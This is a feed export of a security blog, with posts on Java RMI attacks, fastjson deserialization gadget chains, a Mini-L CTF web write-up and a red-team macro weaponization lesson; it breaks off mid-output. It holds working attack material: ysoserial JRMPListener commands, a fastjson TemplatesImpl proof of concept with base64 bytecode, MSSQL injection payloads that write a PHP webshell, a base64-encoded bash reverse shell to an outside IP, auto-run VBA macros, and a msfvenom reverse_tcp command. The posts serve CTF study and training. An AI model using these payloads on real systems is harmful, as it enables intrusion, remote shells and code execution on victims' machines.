    <updated>2023-05-14T13:57:44.832Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频</a></p><p><a href="https://xz.aliyun.com/t/9053#toc-1">参考文章</a></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java RMI机制能够让一台Java虚拟机上的对象调用运行在另一台Java虚拟机上的对象的方法。总结一下，RMI机制的实现依赖于以下三个部分</p><ul><li>RMI Server</li><li>RMI Registry</li><li>RMI Client</li></ul><p>简单概括一下RMI的流程：Server端事先在Registry处<code>bind</code>将要被调用的远程对象。当Client需要调用远程对象时，先根据<code>rmi://</code>地址连接到Registry，然后在Registry处查看是否绑定有需要的远程对象。如果有，则Registry返回Server端的<code>rmi://</code>地址以及开放的端口，Client据此连接到Server。然后才开始真正的远程方法调用，远程方法在Server端执行，Server将执行后的结果发送给Client。</p><h3 id="RMI的恶意利用"><a href="#RMI的恶意利用" class="headerlink" title="RMI的恶意利用"></a>RMI的恶意利用</h3><p>先创建两个项目</p><p><strong>RMIServer</strong></p><p><strong>RMIClient</strong></p><p>这两个项目都要有相同的接口</p><p><img src="../images/image-20230514164640177.png" alt="image-20230514164640177"></p><p><img src="../images/image-20230514164725676.png" alt="image-20230514164725676"></p><p>先创建两个项目，<strong>分别是客户端和服务端(然后有相同的接口)</strong></p><p><img src="../images/image-20230514164826518.png" alt="image-20230514164826518"></p><p>服务端已经开了个端口出去了，客户端就可以直接去进行访问</p><p>但是客户端并不知道开的端口是啥，这里就得通过这个注册中心开的端口来找</p><p>默认的是1099，然后又因为注册中心于服务端开放的端口绑定了，于是就可以通过注册中心来查到服务端开放的端口</p><p><img src="../images/image-20230514165804204.png" alt="image-20230514165804204"></p><p>这里的话是获取注册中心的端口，然后获取绑定的名字，然后在进行函数的调用</p><p><img src="../images/image-20230514165918336.png" alt="image-20230514165918336"></p><p>成功在服务端回显 这里调用的是服务端的sayHello()方法</p><p>这里客户端没写回显，所以没输出</p><p>上面就是简单的RMI的执行过程了</p><h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><h5 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h5><p>此方法可以攻击客户端和服务端</p><p>对于注册中心来说，我们还是从这几个方法触发：</p><ul><li>bind</li><li>unbind</li><li>rebind</li><li>list</li><li>lookup</li></ul><p>除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这里的意思是开启一个恶意的RMI服务端</p><p><img src="../images/image-20230514180701300.png" alt="image-20230514180701300"></p><p>成功执行，只不过本地开的话java版本太高，开不了，所以就用kali的ip,执行不了计算器</p><p>这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的</p><p><strong>剩下的去参考上面的文章就行了，因为其他的没有用到ysoserial服务端进行伪造</strong></p><h3 id="JEP290及其绕过"><a href="#JEP290及其绕过" class="headerlink" title="JEP290及其绕过"></a>JEP290及其绕过</h3><p><a href="https://xz.aliyun.com/t/9053#toc-9">参考文章</a></p><p>这里就不写了，因为写了也是照搬下来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&amp;amp;vd_source=bacfffe46b930fda5761b63367eb298c&quot;&gt;参考视频&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    
    <category term="java-RMI恶意服务" scheme="https://ke1nys.github.io/tags/java-RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>java-fastjson 链子分析</title>
    <link href="https://ke1nys.github.io/posts/7ec3d05a.html"/>
    <id>https://ke1nys.github.io/posts/7ec3d05a.html</id>
    <published>2023-05-10T03:17:37.000Z</published>
    <updated>2023-05-17T08:30:57.113Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/12096#toc-3">参考文章</a></p><p>这里用的是fastjson 1.2.24版本来进行分析</p><p><img src="../images/image-20230510112535170.png" alt="image-20230510112535170"></p><p><img src="../images/image-20230510115514716.png" alt="image-20230510115514716"></p><p>给上面的图片在添加一个条件，满足条件的getter也行</p><p>这就是fastjson和<strong>原生类</strong>的反序列化的不同之处</p><h3 id="JdbcRowSetImpl链子"><a href="#JdbcRowSetImpl链子" class="headerlink" title="JdbcRowSetImpl链子"></a>JdbcRowSetImpl链子</h3><p><strong>这个链子是必须出网的</strong></p><p><code>com.sun.rowset.JdbcRowSetImpl</code>中的<code>dataSourceName</code>属性 寻找他的set方法</p><p><img src="../images/image-20230517154056485.png" alt="image-20230517154056485"></p><p>然后跟进到他的<code>setdataSourceName</code>方法</p><p><img src="../images/image-20230517154148020.png" alt="image-20230517154148020"></p><p>这里就是把传进去的值赋给<code>dataSource</code></p><p>这里再看<code>autoCommit</code>属性，然后去查看他的set方法，<code>setautocommit</code>,需要传入一个布尔类型的参数</p><p><img src="../images/image-20230517154245264.png" alt="image-20230517154245264"></p><p>判断conn是否为空 不然就赋值 跟进connect方法</p><p><img src="../images/image-20230517154459890.png" alt="image-20230517154459890"></p><p><code>lookup(getDataSourceName())</code> lookup函数链接我们写入的服务 加载我们的恶意类<br>构造恶意类</p><p>根据最后的<code>connect()</code>方法，前面的操作就讲得通了</p><p>因为前面得<code>conn</code>默认为空，所以能进入下一层，然后又因为我们给了<code>DataSourceName</code>赋值，又可以进入下一层，然后就是<code>lookup()</code>函数进行连接了，连接得值刚好是<code>DataSourceName</code></p><h3 id="TemplatesImpl-链子"><a href="#TemplatesImpl-链子" class="headerlink" title="TemplatesImpl 链子"></a>TemplatesImpl 链子</h3><p><strong>这个链子是不出网的</strong></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EvilCalss.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为字节码文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;.\\src\\main\\java\\test\\EvilClass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEACUV2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFAAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFwAIABgADAAAAAQAAQAUAAEAFQAAAAIAFg</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;编码\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发；</p><h4 id="动态加载字节码分析"><a href="#动态加载字节码分析" class="headerlink" title="动态加载字节码分析"></a>动态加载字节码分析</h4><p>这里的话在我之前写过得一篇文章也有写这个  <a href="https://ke1nys.github.io/posts/30ead299.html">Java安全之BCEL ClassLoader</a></p><p>首先分析后半部分 即<code>TemplatesImpl</code>中的链子<br>由上文我们知道 ，fastjson使用<code>JSON.parseObject</code>方法反序列化会调用get 和set方法<br>在<code>TemplatesImpl</code>中属性的get和set方法中<br><code>getOutputProperties</code>方法调用了<code>newTransformer</code>方法</p><p><img src="../images/image-20230517160245013.png" alt="image-20230517160245013"></p><p>在<code>newTransformer</code>中调用了<code>getTransletInstance</code>方法</p><p><img src="../images/image-20230517161405853.png" alt="image-20230517161405853"></p><p>这里需要调用到<code>defineTransletClasses</code>所以需要使<code>_name!=null,_class == null</code></p><p><img src="../images/image-20230517161442419.png" alt="image-20230517161442419"></p><p>在defineTransletClasses中 重写了defineClass方法 对<code>_bytecodes</code>中的恶意代码进行加载</p><p><img src="../images/image-20230517161528118.png" alt="image-20230517161528118"></p><p>这部分其实就是CC4 的后半部分</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/12096#toc-3&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里用的是fastjson 1.2.24版本来进行分析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230510112535</summary>
      
    
    
    
    
    <category term="java-fastjson 链子分析" scheme="https://ke1nys.github.io/tags/java-fastjson-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Mini-L CTF web 复现</title>
    <link href="https://ke1nys.github.io/posts/fbdb0624.html"/>
    <id>https://ke1nys.github.io/posts/fbdb0624.html</id>
    <published>2023-05-09T13:00:52.000Z</published>
    <updated>2023-05-14T08:01:08.946Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话只复现部分题</p><p><a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp地址</a></p><h2 id="ezsql-sql-server-mssql"><a href="#ezsql-sql-server-mssql" class="headerlink" title="ezsql(sql server mssql)"></a>ezsql(sql server mssql)</h2><p><img src="../images/image-20230509212213754.png" alt="image-20230509212213754"></p><p><img src="../images/image-20230509213811523.png" alt="image-20230509213811523"></p><p><strong>考查的是sqlserver</strong> <strong>也是mssql</strong></p><p>这里的话是给了查询语句  <strong>列和表都给了  id users</strong></p><p>数据库查询</p><p><img src="../images/image-20230510105038552.png" alt="image-20230510105038552"></p><p><img src="../images/image-20230510105055721.png" alt="image-20230510105055721"></p><p><strong>查出来是ctf</strong>  在sqlserver中 <strong>数据库是db_name()</strong></p><p>拿出祖传字典fuzz一下，发现过滤了<strong>空格、星号、百分号、引号</strong>以及常用的增删查改关键字（<strong>但是大小写能绕过，这个点很重要</strong>）</p><p><a href="http://www.ppmy.cn/news/9311.html">SQL Server注入技巧与提权方式详解</a></p><p><img src="../images/image-20230509214305648.png" alt="image-20230509214305648"></p><p>可以了解一下这个空格绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;ALTER%1eTABLE%1eusers�ADD�wcs�varchar(2000)�NULL;</span><br><span class="line">1;inSert�into�users(id,wcs,name)�values�(17,0x3c3f70687020706870696e666f28293b203f3e,36);</span><br><span class="line">1;declare�@wcs�varchar(2000)�set�@wcs=0x2f7661722f7777772f68746d6c2f6f6b6f6b2e706870�bacKup�log�ctf�to�disk=@wcs�with�init;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230509224513281.png" alt="image-20230509224513281"></p><p><img src="../images/image-20230509224610461.png" alt="image-20230509224610461"></p><p><a href="https://cn-sec.com/archives/1277068.html"><strong>日志备份和差异备份获取webshell</strong></a></p><p><a href="https://www.cnblogs.com/-qing-/p/10910282.html"><strong>Web渗透之mssql差异备份getshell</strong></a></p><p>这里有个小知识点就是得需要bp或则hackbar来写，输入框的话是不能解析url编码的，因为我们需要用url编码来进行空格的绕过</p><p><img src="../images/image-20230511095149341.png" alt="image-20230511095149341"></p><h2 id="minijava-RMI反序列化漏洞"><a href="#minijava-RMI反序列化漏洞" class="headerlink" title="minijava(RMI反序列化漏洞)"></a>minijava(<strong>RMI反序列化漏洞</strong>)</h2><p><img src="../images/image-20230511095830489.png" alt="image-20230511095830489"></p><p><strong>先使用jd-gui工具把class文件变成java文件</strong></p><p><img src="../images/image-20230513152909440.png" alt="image-20230513152909440"></p><p>1.先导入pom.xml里面的东西</p><p>2.然后按照jar包里面的构造来idea里面构造个一模一样的</p><p>然后在把jar里面的内容照搬进去就行了</p><p>这道题如果是对经常做java题目的师傅来看的话是一下就能看出是利用RMI来打的</p><p><img src="../images/image-20230511101201537.png" alt=" "></p><p>先去查看一下pom.xml，发现是cc3的链子</p><p><img src="../images/image-20230511102446188.png" alt="image-20230511102446188"></p><p>因为这里添加了个白名单过滤，所以说不能直接用cc3来打了</p><p>然后去看了一下MainController.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = false)</span> String data)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[] userData = Base64.getDecoder().decode(data);</span><br><span class="line">      <span class="type">SerialKiller</span> <span class="variable">serialKiller</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(userData), <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">      user = (User)serialKiller.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;unserialize error, no!&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;unserialize done, &quot;</span> + user.getUsername() + <span class="string">&quot; have fun!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就去查看这个readObject() 这里显示是User这个类里边的</p><p><img src="../images/image-20230511102938179.png" alt="image-20230511102938179"></p><p>这里边的registry和lookup做题多的一看就知道是rmi恶意服务</p><p>这里的话registry1可控，然后只需要绕过上面的的if判断就行了</p><p>然后打<strong>RMI反序列化漏洞</strong>，最终可以实现绕过白名单任意反序列化，从而打CC链来rce</p><p><strong>这里如果是是用hackbar发包的话，得注意要进行url编码，不会会失败</strong></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>需要在自己的服务器上执行</strong></p><p>接下来就不写了  直接去看官方的wp吧 <a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp</a></p><p>接下来就写篇文章来学习一下<strong>RMI</strong>和<strong>cc3</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的话只复现部分题&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md&quot;&gt;官方wp地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ezsql-sql-ser</summary>
      
    
    
    
    
    <category term="Mini-L CTF web 复现" scheme="https://ke1nys.github.io/tags/Mini-L-CTF-web-%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>thm-红队-初始访问-武器化</title>
    <link href="https://ke1nys.github.io/posts/add7d84.html"/>
    <id>https://ke1nys.github.io/posts/add7d84.html</id>
    <published>2023-05-08T15:06:25.000Z</published>
    <updated>2023-05-14T13:33:48.368Z</updated>
    
    <content type="html"><![CDATA[<p>前两个是 VBScript 代码  和  HTA代码</p><p>前者是可以在本地上运行，后者是可以弹shell也可以在本地运行</p><h3 id="应用程序的-Visual-Basic-VBA"><a href="#应用程序的-Visual-Basic-VBA" class="headerlink" title="应用程序的 Visual Basic (VBA)"></a>应用程序的 Visual Basic (VBA)</h3><p><strong>这是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实施的一种编程语言</strong></p><p><strong>VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</strong> </p><p>这句话是重点</p><p><strong>宏是 Microsoft Office 应用程序，其中包含以称为 Visual Basic for Applications (VBA) 的编程语言编写的嵌入式代码。它用于创建自定义功能，以通过创建自动化流程来加速手动任务</strong></p><p><strong>我们将讨论 VBA 的基础知识以及对手使用宏创建恶意 Microsoft 文档的方式</strong>。</p><p>现在创建一个新的空白 Microsoft 文档来创建我们的第一个 宏。目的是讨论该语言的基础知识，并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择 视图→ 宏来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏</p><p><img src="../images/image-20230508231520977.png" alt="image-20230508231520977"></p><p><img src="../images/image-20230508231606126.png" alt="image-20230508231606126"></p><p>点击创建后的样子</p><p>然后进行内容创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub THM()</span><br><span class="line">  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>然后点击运行<img src="../images/image-20230508231803055.png" alt="image-20230508231803055"></p><p>现在，为了在文档打开后自动执行 VBA 代码，我们可以使用内置函数，例如 AutoOpen 和 Document_open。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>重要的是要注意，要使宏起作用，我们需要将其保存为启用宏的格式，例如.doc 和 docm。现在让我们将文件保存为Word 97-2003 模板，通过转到文件→保存 Document1并保存为类型 → Word 97-2003 文档启用 宏，最后保存.</p><p><img src="../images/image-20230508232155649.png" alt="image-20230508232155649"></p><p>运行文档后就会自动执行</p><p><strong><img src="../images/image-20230508232335996.png" alt="image-20230508232335996"></strong></p><p>现在编辑 word 文档并创建一个执行calc.exe 或任何可执行文件的宏函数作为概念证明，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;calc.exe&quot;</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>和前面保存的步骤一样，然后点击运行就弹出计算器了</p><p>得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合使用。VBA/宏本身并不能绕过任何检测</p><p><strong>接下来是利用VBA进行shell的反弹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 